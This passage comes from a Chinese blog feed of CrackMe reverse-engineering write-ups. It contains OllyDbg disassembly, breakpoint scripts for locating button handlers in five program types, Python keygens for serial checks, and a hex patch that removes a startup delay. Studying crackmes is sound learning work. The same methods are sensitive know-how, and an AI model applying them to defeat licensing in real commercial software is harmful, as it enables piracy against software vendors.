观察简单一个KEY，输入后弹出错误提示PEID查看一下，无壳，VB写的载入OD，智能搜索字符串双击succesful进入对应汇编代码简单分析可以看到关键跳然后向上找到这个函数入口，往下单步执行，容易看到在获得输入KEY后紧接着有个strcmp,其上一行出现了正确KEY.验证一下OK 结束","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"CrackMe 006 占位（总结五种语言按钮事件的找法）","slug":"CrackMe-006-占位（总结五种语言按钮事件的找法）","date":"2017-08-22T12:57:45.000Z","updated":"2018-07-30T13:17:37.941Z","comments":true,"path":"2017/08/22/CrackMe-006-占位（总结五种语言按钮事件的找法）/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/22/CrackMe-006-占位（总结五种语言按钮事件的找法）/","excerpt":"我想我可以去die了… CrackMe 006也有点难。。。 伤心总结五种语言按钮事件的找法~","text":"我想我可以去die了… CrackMe 006也有点难。。。 伤心总结五种语言按钮事件的找法~这里有个教程感觉也不是很好：http://www.dbgpro.com/archives/317.html中间就不照号了 其间看到一篇不同语言程序找按钮事件的方法，转载到此： 总结五种语言按钮事件的找法调试软件,最重要的就是下断点,那么如何下断点,就是一门重要的技巧.比如:弹提示框,就下MessageBoxA,注册表的,就下RegOpenKeyA等等.当然,能直接下到按钮事件,当然更为方便,因为到了按钮事件后,很快就会到达核心代码,离你的破解也就不远了.本文就总结一下各类语言找按钮事件的方法,当然也可以借助工具,如VBexplorer,DEDE,ECE等等. 一、VB程序其实,VB的按钮事件的找法是最为普遍的,也就是大家所谓的万能断点.其实也不仅仅是针对按钮事件,还有很多其他的用处,如取消NAG,启动框,灰色按钮或隐藏按钮,启动时的timer事件等等,具体的就自己去总结吧,这里只演示按钮事件! OD载入后,CTRL+B,816C24 然后,就在下面的JMP处F2下断,下完后CTRL+L,如果还有,就继续下断点. 下完断点后,运行程序,点击相应的按钮,OD就会断下来了 下面的任务就是考验大家的耐心,F8跟踪吧,不再赘述了. 当然,为了方便大家,可以写个简单的脚本,免的每次都去手动设置了,节省时间:复制内容到剪贴板代码: var Addr mov Addr,401000 loop: find Addr,#816C2404??000000# cmp $RESULT,0 je Exit add $RESULT,08 bp $RESULT add $RESULT,1 mov Addr,$RESULT jmp loop Exit: eval &quot;按钮事件查找完毕!&quot; msg $RESULT ret 二、Delphi和BC++程序Delphi和BC++都是同一公司开发的,故查找方法都一样,当然你也可以使用DEDE. OD载入后,CTRL+G,转到00401000处然后就CTRL+B,查找特征码740E8BD38B83????????FF93???????? 然后就会找到下面的地方: 然后就在下面的CALL处下断吧. 下面的工作就是不断的CTRL+L继续查找和F2下断了. 同样写个脚本,方便大家操作:复制内容到剪贴板代码: var Addr mov Addr,401000 loop: find Addr,#740E8BD38B83????????FF93????????# cmp $RESULT,0 je Exit add $RESULT,0A bp $RESULT add $RESULT,1 mov Addr,$RESULT jmp loop Exit: ret 三、易语言易语言的这种查找方法,同样适合有壳的程序,其他的就必须脱壳后再继续操作了. OD载入后,就F9运行程序吧,当程序运行后,ALT+E选中易语言的核心库krnln,双击进去 然后CTRL+B,查找FF 55 FC 查找到的这个CALL就是了,F2下断吧 现在输入必须的内容后,单击对应的按钮吧 断下了就F7跟进吧,就来到按钮事件处了 同样,写个脚本,方便大家复制内容到剪贴板代码: gpa&quot;GetProcessHeap&quot;,&quot;kernel32.dll&quot; cmp $RESULT,0 je err bp $RESULT run run run bc $RESULT rtu find 10001000,#FF55FC5F5E895D??8945# bp $RESULT find eip,#FFE0# cmp$RESULT,0 je err bp $RESULT run bc $RESULT sto MSG &quot;按钮事件查找完毕！&quot; ret err: MSG &quot;脚本运行错误！请检查错误后再继续运行脚本！&quot; ret 四、VC++程序(非MFC程序)OD载入后,单击鼠标右键,选择”查找”,然后是”所有命令”在弹出的输入框里,写入特征代码”sub eax,0a“ 在下面的sub eax,0A处,双击进去吧: 来找这里后,在下面的je处跟随过去 跟随来到的这个CALL,就是了,F2下断吧 然后断下后,F7跟进,F8几次,就来到按钮事件了. 五、MFC类程序当然判断MFC和非MFC的程序,靠大家自己去判断了OD载入后.ALT+E,来到可执行模块,找MFC的核心DLL:MFC42然后就双击进去 然后就CTRL+F,查找特征代码:sub eax,0a 同样,找到后,就在下面的je处跟随,跟随后看到的CALL,就是那个关键CALL了! 断下后F7跟进,F8几次,就会来到按钮事件代码处了! 方法就简单的介绍到这里了,当然只是抛砖引玉,其他的,还得多靠大家自己慢慢总结吧!","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"CrackMe 005 占位 {{{(>_<)}}}","slug":"CrackMe-005-占位","date":"2017-08-21T13:34:32.000Z","updated":"2018-07-30T13:16:19.110Z","comments":true,"path":"2017/08/21/CrackMe-005-占位/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/21/CrackMe-005-占位/","excerpt":"呃，CrackMe 005有点难…题解也老长了，暂时记下，日后等水平稍微提升一点点再来战它。","text":"呃，CrackMe 005有点难…题解也老长了，暂时记下，日后等水平稍微提升一点点再来战它。首先记下CrackMe 005的两个题解链接： https://www.52pojie.cn/thread-366291-1-1.html http://blog.csdn.net/liwz11/article/details/50726518","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"CrackMe 004","slug":"CrackMe-004","date":"2017-08-20T13:03:08.000Z","updated":"2018-07-30T13:13:58.237Z","comments":true,"path":"2017/08/20/CrackMe-004/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/20/CrackMe-004/","excerpt":"首先说一下，这个题是比较有“脾气”的。OK，咱们就来看看它到底是什么脾气…","text":"首先说一下，这个题是比较有“脾气”的。OK，咱们就来看看它到底是什么脾气… 观察当自己输入伪码后发现怎么没有确定键呀？进一步观察发现，当光标进入灰色区域是光标旁边会出现提示：注册成功时会在下面出现一张照片然后我们可以假想一下题目的思路：可能是当输入正确的信息后点击灰色区域就会出现照片，而输入伪码时就会陷入死循环… 查壳Delphi，没有加壳由于对Delphi不是很熟悉，因此网上查了一下大佬们在逆Delphi时的各种姿势，发现了一个很好用的工具Dede，于是下载下来然后拖入程序进行分析。查看过程发现过程窗口里面有chkcode事件，这就很有可能是我们要找的计算序列号的函数了，查看RVA是00457C40那么在OD当中，ctrl+G 找到这个位置，下断点分析 00457C40 /. 55 push ebp 00457C41 |. 8BEC mov ebp,esp 00457C43 |. 51 push ecx 00457C44 |. B9 05000000 mov ecx,0x5 00457C49 |&gt; 6A 00 /push 0x0 00457C4B |. 6A 00 |push 0x0 00457C4D |. 49 |dec ecx 00457C4E |.^ 75 F9 \\jnz short CKme.00457C49 00457C50 |. 51 push ecx 00457C51 |. 874D FC xchg [local.1],ecx 00457C54 |. 53 push ebx 00457C55 |. 56 push esi 00457C56 |. 8BD8 mov ebx,eax 00457C58 |. 33C0 xor eax,eax 00457C5A |. 55 push ebp 00457C5B |. 68 3D7E4500 push CKme.00457E3D 00457C60 |. 64:FF30 push dword ptr fs:[eax] 00457C63 |. 64:8920 mov dword ptr fs:[eax],esp 00457C66 |. 8BB3 F8020000 mov esi,dword ptr ds:[ebx+0x2F8] ; esi=len(name) 00457C6C |. 83C6 05 add esi,0x5 ; esi+=5 00457C6F |. FFB3 10030000 push dword ptr ds:[ebx+0x310] ; 黑头Sun Bird 00457C75 |. 8D55 F8 lea edx,[local.2] 00457C78 |. 8BC6 mov eax,esi 00457C7A |. E8 85FEFAFF call CKme.00407B04 00457C7F |. FF75 F8 push [local.2] ; 9 00457C82 |. FFB3 14030000 push dword ptr ds:[ebx+0x314] ; dseloffc-012-OK 00457C88 |. 8D55 F4 lea edx,[local.3] 00457C8B |. 8B83 D4020000 mov eax,dword ptr ds:[ebx+0x2D4] 00457C91 |. E8 B2B6FCFF call CKme.00423348 00457C96 |. FF75 F4 push [local.3] 00457C99 |. 8D83 18030000 lea eax,dword ptr ds:[ebx+0x318] 00457C9F |. BA 04000000 mov edx,0x4 00457CA4 |. E8 93BFFAFF call CKme.00403C3C 00457CA9 |. 33D2 xor edx,edx 00457CAB |. 8B83 F4020000 mov eax,dword ptr ds:[ebx+0x2F4] 00457CB1 |. E8 AAB5FCFF call CKme.00423260 00457CB6 |. 8B93 18030000 mov edx,dword ptr ds:[ebx+0x318] ; 黑头Sun Bird9dseloffc-012-OKtest 记为_str 00457CBC |. 8B83 F4020000 mov eax,dword ptr ds:[ebx+0x2F4] 00457CC2 |. E8 B1B6FCFF call CKme.00423378 00457CC7 |. 33F6 xor esi,esi 00457CC9 |&gt; 8D55 EC /lea edx,[local.5] 00457CCC |. 8B83 D4020000 |mov eax,dword ptr ds:[ebx+0x2D4] 00457CD2 |. E8 71B6FCFF |call CKme.00423348 00457CD7 |. 8B45 EC |mov eax,[local.5] 00457CDA |. E8 9DBEFAFF |call CKme.00403B7C 00457CDF |. 83C0 03 |add eax,0x3 00457CE2 |. 8D55 F0 |lea edx,[local.4] 00457CE5 |. E8 1AFEFAFF |call CKme.00407B04 00457CEA |. FF75 F0 |push [local.4] 00457CED |. 8D55 E8 |lea edx,[local.6] 00457CF0 |. 8B83 D4020000 |mov eax,dword ptr ds:[ebx+0x2D4] 00457CF6 |. E8 4DB6FCFF |call CKme.00423348 00457CFB |. FF75 E8 |push [local.6] 00457CFE |. 8D55 E4 |lea edx,[local.7] 00457D01 |. 8BC6 |mov eax,esi 00457D03 |. E8 FCFDFAFF |call CKme.00407B04 00457D08 |. FF75 E4 |push [local.7] 00457D0B |. 8D45 FC |lea eax,[local.1] 00457D0E |. BA 03000000 |mov edx,0x3 00457D13 |. E8 24BFFAFF |call CKme.00403C3C 00457D18 |. 46 |inc esi 00457D19 |. 83FE 13 |cmp esi,0x13 00457D1C |.^ 75 AB \\jnz short CKme.00457CC9 00457D1E |. 8D55 E0 lea edx,[local.8] 00457D21 |. 8B83 D8020000 mov eax,dword ptr ds:[ebx+0x2D8] 00457D27 |. E8 1CB6FCFF call CKme.00423348 ; get input serial 00457D2C |. 8B45 E0 mov eax,[local.8] 00457D2F |. 8B93 18030000 mov edx,dword ptr ds:[ebx+0x318] ; 出现 _str+name 黑头Sun Bird9dseloffc-012-OKtest 00457D35 |. E8 52BFFAFF call CKme.00403C8C ; compare 这里就是分析之后的结果，先计算name的长度，然后加5，之后与指定字符串进行拼接，最后结尾接上name。keygen: #coding:gb18030 def keygen(name): serial=len(name)+5 serial=&apos;黑头Sun Bird&apos;+str(serial)+&apos;dseloffc-012-OK&apos;+name print serial name=raw_input(&apos;please input the name: &apos;) keygen(name) 随便生成一个name/serial组合试一下name:111serial:黑头Sun Bird8dseloffc-012-OK111 最终破解完成. ………………………………………………………………………………………………… 其实这个题的内部结构远比以上分析的复杂，以上只是捡关键的在分析，正在交错的地方，或许根本没触及到…可以进一步参考如下链接：http://blog.csdn.net/liwz11/article/details/50717038","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"CrackMe 003","slug":"CrackMe-003","date":"2017-08-19T07:13:59.000Z","updated":"2018-07-30T13:13:35.822Z","comments":true,"path":"2017/08/19/CrackMe-003/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/19/CrackMe-003/","excerpt":"算法部分又出新花样，在第二题之上加入了浮点运算，加上战线拉的长，需要耐心分析方可得出Key… en,最后再加个解除延时… [多看看浮点汇编运算]","text":"算法部分又出新花样，在第二题之上加入了浮点运算，加上战线拉的长，需要耐心分析方可得出Key… en,最后再加个解除延时… [多看看浮点汇编运算] 观察运行程序ei？这里好像有一个延时吖，嗯，是的。输入test 1234 确定目标一.找到注册机二.解除延时 一.找到注册机加载进入OD，查找错误提示字符串，找到对应汇编代码查看上面相关代码，很容易找到关键跳然后就开始分析算法了…找到这个函数开始，下断，然后F9，一步步找到有用代码函数开始到关键跳代码比较冗长，只跳关键部分进行重点分析第一部分： 004081E3 FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; **get input name 004081E9 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0] 004081EF 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; **eax=name 004081F2 50 push eax 004081F3 8B1A mov ebx,dword ptr ds:[edx] 004081F5 FF15 F8B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; **get length of name 004081FB 8BF8 mov edi,eax ; **edi=name length 004081FD 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; **ecx=name 00408200 69FF 385B0100 imul edi,edi,0x15B38 ; **edi*=0x15B38 00408206 51 push ecx 00408207 0F80 B7050000 jo AfKayAs_.004087C4 ; *jump overflow 0040820D FF15 0CB14000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; **get name[0] 00408213 0FBFD0 movsx edx,ax ; **edx=name[0] 计算第一个字符的ASCII码值 00408216 03FA add edi,edx ; **edi+=name[0] 00408218 0F80 A6050000 jo AfKayAs_.004087C4 ; *jump overflow 0040821E 57 push edi 0040821F FF15 F4B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; **hex-&gt;dec EDI结果转成10进制数 00408225 8BD0 mov edx,eax 00408227 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 这段汇编代码与CrackMe2中的代码的流程是一样的，算法就是（name的长度）*0x15B38+第一个字符的ASCII码值，转成10进制字符串，这个简单。之后，我们再向后看，肯定有不同的位置，发现出现了浮点数运算:我们继续对代码进行分析，到跳转条件前一共主要出现了四段浮点数的汇编部分:第二部分： 004082E7 8B19 mov ebx,dword ptr ds:[ecx] 004082E9 FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; name转换成浮点数,结果在浮点寄存器里 004082EF D905 08104000 fld dword ptr ds:[0x401008] ; **将0401008中的硬编码实型存入st0 004082F5 833D 00904000 0&gt;cmp dword ptr ds:[0x409000],0x0 004082FC 75 08 jnz short AfKayAs_.00408306 004082FE D835 0C104000 fdiv dword ptr ds:[0x40100C] 00408304 EB 0B jmp short AfKayAs_.00408311 00408306 FF35 0C104000 push dword ptr ds:[0x40100C] 0040830C E8 578DFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt; 00408311 83EC 08 sub esp,0x8 00408314 DFE0 fstsw ax ; **将st0中的值复制到ax中 00408316 A8 0D test al,0xD 00408318 0F85 A1040000 jnz AfKayAs_.004087BF 0040831E DEC1 faddp st(1),st ; **将st(num)和st相加，用和来替换st(num),将st出栈 00408320 DFE0 fstsw ax 00408322 A8 0D test al,0xD 00408324 0F85 95040000 jnz AfKayAs_.004087BF 0040832A DD1C24 fstp qword ptr ss:[esp] 0040832D FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt; 00408333 8BD0 mov edx,eax 其实这部分并没有做什么实质上的工作，不过通过浮点数运算对内存中的数据进行改动(我们后面会发现这些内存地址都用了，但我们并不需要考虑这些，直接当做硬编码处理就可以了)。第三部分： 004083F3 8B19 mov ebx,dword ptr ds:[ecx] 004083F5 FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt; 004083FB DC0D 10104000 fmul qword ptr ds:[0x401010] ; **name=name*3 00408401 83EC 08 sub esp,0x8 00408404 DC25 18104000 fsub qword ptr ds:[0x401018] ; **name=name-2 0040840A DFE0 fstsw ax 0040840C A8 0D test al,0xD 0040840E 0F85 AB030000 jnz AfKayAs_.004087BF 00408414 DD1C24 fstp qword ptr ss:[esp] ; **结果存入堆栈 00408417 FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt; 0040841D 8BD0 mov edx,eax 可以看到，这部分对输入的name进行了简单的浮点运算:name=name*3-2第四部分： 004084DD 8B19 mov ebx,dword ptr ds:[ecx] 004084DF FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt; 004084E5 DC25 20104000 fsub qword ptr ds:[0x401020] ; **str-(-15) 004084EB 83EC 08 sub esp,0x8 004084EE DFE0 fstsw ax 004084F0 A8 0D test al,0xD 004084F2 0F85 C7020000 jnz AfKayAs_.004087BF 004084F8 DD1C24 fstp qword ptr ss:[esp] 004084FB FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt; 00408501 8BD0 mov edx,eax 又对name进行了简单的操作，name=name-(-0x15);第五部分： 004085C8 FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt; 004085CE 8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; **eax=input serial 004085D1 50 push eax ; **serial转换成浮点数 004085D2 FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; 004085D8 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] 004085DB DD9D 1CFFFFFF fstp qword ptr ss:[ebp-0xE4] 004085E1 51 push ecx ; **我们输入的serila转化成浮点数 004085E2 FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt; 004085E8 833D 00904000 0&gt;cmp dword ptr ds:[0x409000],0x0 004085EF 75 08 jnz short AfKayAs_.004085F9 004085F1 DCBD 1CFFFFFF fdivr qword ptr ss:[ebp-0xE4] ; **name/serial值存入st0 004085F7 EB 11 jmp short AfKayAs_.0040860A 004085F9 FFB5 20FFFFFF push dword ptr ss:[ebp-0xE0] 004085FF FFB5 1CFFFFFF push dword ptr ss:[ebp-0xE4] 00408605 E8 888AFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt; 0040860A DFE0 fstsw ax 0040860C A8 0D test al,0xD 0040860E 0F85 AB010000 jnz AfKayAs_.004087BF 00408614 FF15 34B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt; 0040861A DC1D 28104000 fcomp qword ptr ds:[0x401028] ; **判断name/serial==1？ 00408620 DFE0 fstsw ax 00408622 F6C4 40 test ah,0x40 00408625 74 07 je short AfKayAs_.0040862E 这一部分实现的就是上面步骤生成的serial与我们输入的serial进行比较，只不过利用了有一点迷糊性质的浮点数除法，判断结果是否等于1而已。我们在总结一下算法，Name/Serial关系为： Serial = (strlen(Name)0x15B38+Name[0]+2.0)3.0-2.0+15写出注册机:（python） # coding=utf8 s = raw_input(&quot;name:&quot;) print &quot;password:&quot;+str((len(s)*0x15B38+ord(s[:1])+2)*3-2+15) 最后总结一下，其实算法很简单，不过用浮点数汇编来迷惑罢了。 二.解除延时打开程序，首先会出现如下界面程序会停在该界面若干秒，然后才进入主界面，我们要去掉这个延时界面。使用OllyDbg工具打开程序，进入调试运行，程序首先断在系统领空右键-&gt;查找-&gt;所以模块中的名称，在弹出的All names窗口中找到SetTimer双击SetTimer代码所在位置，然后设置断点调试运行，程序断在刚才设置的断点处，此时查看堆栈：可知延时界面的滞留时间为7000ms，相应的十六进制值为0x00001B58去掉这个延时界面只需将该时间修改得足够小但是该时间位于系统领空，无法直接用OllyDbg进行修改保存，我们借助WinHex工具使用WinHex工具打开程序，在菜单中选择Search -&gt; Find Hex Values，查找十六进制值581B0000将该值修改为01000000，即延时时间为0x00000001ms，保存即可。然后运行程序，发现不再延迟喽… ………………………………………………………分割线…………………………………………….其实自己也没必要太过灰心，毕竟自己也是刚开始学逆向没多久，根据汇编代码来推出算法对自己来说虽然还有难度，其实多遇到些题目，多总结经验慢慢的就很容易了。（其实现在做的题还是蛮难的，高手也得吮吮手指头呢…) hhh","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"CrackMe 002","slug":"CrackMe-002","date":"2017-08-18T13:45:03.000Z","updated":"2018-07-30T13:13:07.182Z","comments":true,"path":"2017/08/18/CrackMe-002/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/18/CrackMe-002/","excerpt":"直接转入正题…","text":"直接转入正题… 观察程序随便输入数据可知还是老思路 查壳，并且获取语言信息无壳，VB写的 破解加载进OD，字符串搜索Try Again,找到对应汇编代码，上下观看相关代码，发现战线拉得有点长，不过没关系，耐心一点就没问题。向上翻会找到关键跳转然后分析跳转上面的代码，找到函数开头（有点远），下断点，开始分析 00402310 &gt; \\55 push ebp 00402311 . 8BEC mov ebp,esp 00402313 . 83EC 0C sub esp,0xC 00402316 . 68 26104000 push &lt;jmp.&amp;MSVBVM50.__vbaExceptHandler&gt; ; SE 处理程序安装 0040231B . 64:A1 0000000&gt;mov eax,dword ptr fs:[0] 00402321 . 50 push eax 00402322 . 64:8925 00000&gt;mov dword ptr fs:[0],esp 00402329 . 81EC B0000000 sub esp,0xB0 0040232F . 53 push ebx 00402330 . 56 push esi 00402331 . 8B75 08 mov esi,dword ptr ss:[ebp+0x8] ; Afkayas_.&lt;ModuleEntryPoint&gt; 00402334 . 57 push edi 00402335 . 8BC6 mov eax,esi 00402337 . 83E6 FE and esi,-0x2 0040233A . 8965 F4 mov dword ptr ss:[ebp-0xC],esp 0040233D . 83E0 01 and eax,0x1 00402340 . 8B1E mov ebx,dword ptr ds:[esi] 00402342 . C745 F8 08104&gt;mov dword ptr ss:[ebp-0x8],Afkayas_.0040&gt; 00402349 . 56 push esi 0040234A . 8945 FC mov dword ptr ss:[ebp-0x4],eax 0040234D . 8975 08 mov dword ptr ss:[ebp+0x8],esi 00402350 . FF53 04 call dword ptr ds:[ebx+0x4] 00402353 . 8B83 10030000 mov eax,dword ptr ds:[ebx+0x310] 00402359 . 33FF xor edi,edi 0040235B . 56 push esi 0040235C . 897D E8 mov dword ptr ss:[ebp-0x18],edi 0040235F . 897D E4 mov dword ptr ss:[ebp-0x1C],edi 00402362 . 897D E0 mov dword ptr ss:[ebp-0x20],edi 00402365 . 897D DC mov dword ptr ss:[ebp-0x24],edi 00402368 . 897D D8 mov dword ptr ss:[ebp-0x28],edi 0040236B . 897D D4 mov dword ptr ss:[ebp-0x2C],edi 0040236E . 897D C4 mov dword ptr ss:[ebp-0x3C],edi 00402371 . 897D B4 mov dword ptr ss:[ebp-0x4C],edi 00402374 . 897D A4 mov dword ptr ss:[ebp-0x5C],edi 00402377 . 897D 94 mov dword ptr ss:[ebp-0x6C],edi 0040237A . 8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax 00402380 . FFD0 call eax 00402382 . 8D4D D4 lea ecx,dword ptr ss:[ebp-0x2C] 00402385 . 50 push eax 00402386 . 51 push ecx 00402387 . FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;; msvbvm50.__vbaObjSet 0040238D . 8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300] 00402393 . 56 push esi 00402394 . 8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax 0040239A . 899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx 004023A0 . FFD3 call ebx 004023A2 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24] 004023A5 . 50 push eax 004023A6 . 52 push edx ; ntdll.KiFastSystemCallRet 004023A7 . FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;; msvbvm50.__vbaObjSet 004023AD . 8BD8 mov ebx,eax 004023AF . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18] 004023B2 . 51 push ecx 004023B3 . 53 push ebx 004023B4 . 8B03 mov eax,dword ptr ds:[ebx] 004023B6 . FF90 A0000000 call dword ptr ds:[eax+0xA0] 004023BC . 3BC7 cmp eax,edi 004023BE . 7D 12 jge short Afkayas_.004023D2 004023C0 . 68 A0000000 push 0xA0 004023C5 . 68 5C1B4000 push Afkayas_.00401B5C 004023CA . 53 push ebx 004023CB . 50 push eax 004023CC . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj 004023D2 &gt; 56 push esi 004023D3 . FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4] 004023D9 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28] 004023DC . 50 push eax 004023DD . 52 push edx ; ntdll.KiFastSystemCallRet 004023DE . FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;; msvbvm50.__vbaObjSet 004023E4 . 8BD8 mov ebx,eax 004023E6 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C] 004023E9 . 51 push ecx 004023EA . 53 push ebx 004023EB . 8B03 mov eax,dword ptr ds:[ebx] 004023ED . FF90 A0000000 call dword ptr ds:[eax+0xA0] ; **get the Name we input** 004023F3 . 3BC7 cmp eax,edi 004023F5 . 7D 12 jge short Afkayas_.00402409 004023F7 . 68 A0000000 push 0xA0 004023FC . 68 5C1B4000 push Afkayas_.00401B5C 00402401 . 53 push ebx 00402402 . 50 push eax 00402403 . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj 00402409 &gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0] 0040240F . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; **save Name to EAX** 00402412 . 50 push eax 00402413 . 8B1A mov ebx,dword ptr ds:[edx] 00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt; **get length of Name** 0040241B . 8BF8 mov edi,eax ; **EDI = length of Name** 0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; **save Name to ECX** 00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; **EDI *= 0x17CFB** 00402426 . 51 push ecx 00402427 . 0F80 91020000 jo Afkayas_.004026BE 判断是否溢出的，溢出就直接ERROR 0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] **get the 1&apos;st char of Name** 00402433 . 0FBFD0 movsx edx,ax ; edx=a[0] 00402436 . 03FA add edi,edx ** EDI += Name[0] remember as _res** 00402438 . 0F80 80020000 jo Afkayas_.004026BE 0040243E . 57 push edi 0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; _str = itos(_res) 00402445 . 8BD0 mov edx,eax 00402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 0040244A . FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;; msvbvm50.__vbaStrMove 00402450 . 8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0] 00402456 . 50 push eax 00402457 . 57 push edi 00402458 . FF93 A4000000 call dword ptr ds:[ebx+0xA4] 0040245E . 85C0 test eax,eax 00402460 . 7D 12 jge short Afkayas_.00402474 00402462 . 68 A4000000 push 0xA4 00402467 . 68 5C1B4000 push Afkayas_.00401B5C 0040246C . 57 push edi 0040246D . 50 push eax 0040246E . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj 00402474 &gt; 8D45 E0 lea eax,dword ptr ss:[ebp-0x20] 00402477 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C] 0040247A . 50 push eax 0040247B . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18] 0040247E . 51 push ecx 0040247F . 52 push edx ; ntdll.KiFastSystemCallRet 00402480 . 6A 03 push 0x3 00402482 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStrList 00402488 . 83C4 10 add esp,0x10 0040248B . 8D45 D4 lea eax,dword ptr ss:[ebp-0x2C] 0040248E . 8D4D D8 lea ecx,dword ptr ss:[ebp-0x28] 00402491 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24] 00402494 . 50 push eax 00402495 . 51 push ecx 00402496 . 52 push edx ; ntdll.KiFastSystemCallRet 00402497 . 6A 03 push 0x3 00402499 . FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;; msvbvm50.__vbaFreeObjList 0040249F . 8B06 mov eax,dword ptr ds:[esi] 004024A1 . 83C4 10 add esp,0x10 004024A4 . 56 push esi 004024A5 . FF90 04030000 call dword ptr ds:[eax+0x304] 004024AB . 8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaOb&gt;; msvbvm50.__vbaObjSet 004024B1 . 50 push eax 004024B2 . 8D45 DC lea eax,dword ptr ss:[ebp-0x24] 004024B5 . 50 push eax 004024B6 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaObjSet&gt; 004024B8 . 8BF8 mov edi,eax 004024BA . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18] 004024BD . 52 push edx ; ntdll.KiFastSystemCallRet 004024BE . 57 push edi 004024BF . 8B0F mov ecx,dword ptr ds:[edi] 004024C1 . FF91 A0000000 call dword ptr ds:[ecx+0xA0] 004024C7 . 85C0 test eax,eax 004024C9 . 7D 12 jge short Afkayas_.004024DD 004024CB . 68 A0000000 push 0xA0 004024D0 . 68 5C1B4000 push Afkayas_.00401B5C 004024D5 . 57 push edi 004024D6 . 50 push eax 004024D7 . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj 004024DD &gt; 56 push esi 004024DE . FF95 40FFFFFF call dword ptr ss:[ebp-0xC0] 004024E4 . 50 push eax 004024E5 . 8D45 D8 lea eax,dword ptr ss:[ebp-0x28] 004024E8 . 50 push eax 004024E9 . FFD3 call ebx 004024EB . 8BF0 mov esi,eax 004024ED . 8D55 E4 lea edx,dword ptr ss:[ebp-0x1C] 004024F0 . 52 push edx ; 